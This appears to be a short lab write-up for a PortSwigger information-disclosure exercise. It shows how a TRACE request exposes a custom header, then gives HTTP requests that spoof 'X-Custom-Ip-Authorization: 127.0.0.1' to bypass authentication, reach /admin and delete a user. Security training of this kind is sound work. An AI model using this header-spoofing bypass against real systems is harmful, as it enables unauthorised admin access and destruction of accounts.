# Authentication Bypass via Information Disclosure

The admin interface in this lab has an authentication bypass flaw, but exploiting it requires knowing the name of a custom HTTP header used by the front-end — without that, it isn't practically exploitable.

**Goal:** Discover that header name, use it to bypass authentication, reach the admin interface, and delete Carlos's account.

Login credentials for your own account: wiener:peter

---

**Reference:**
- https://portswigger.net/web-security/information-disclosure/exploiting

<img width="762" height="320" alt="1" src="https://github.com/user-attachments/assets/240400f8-e2a5-4935-aff5-b897938bdada" />


---

After logging in, sending a request with the `TRACE` HTTP method reveals the header name: `X-Custom-IP-Authorization`:

<img width="916" height="534" alt="2" src="https://github.com/user-attachments/assets/829c46ed-f4b4-4ac3-8b4b-42b339a07238" />


`/admin` can then be reached using:

```
GET /admin HTTP/2
...
X-Custom-Ip-Authorization: 127.0.0.1
```

<img width="918" height="445" alt="3" src="https://github.com/user-attachments/assets/996b1029-92eb-4c59-97bd-996e76b67325" />


And the target user deleted with:

```
GET /admin/delete?username=carlos HTTP/2
...
X-Custom-Ip-Authorization: 127.0.0.1
```

<img width="701" height="444" alt="4" src="https://github.com/user-attachments/assets/641e3051-b9eb-4168-9070-27bf8c117f9b" />

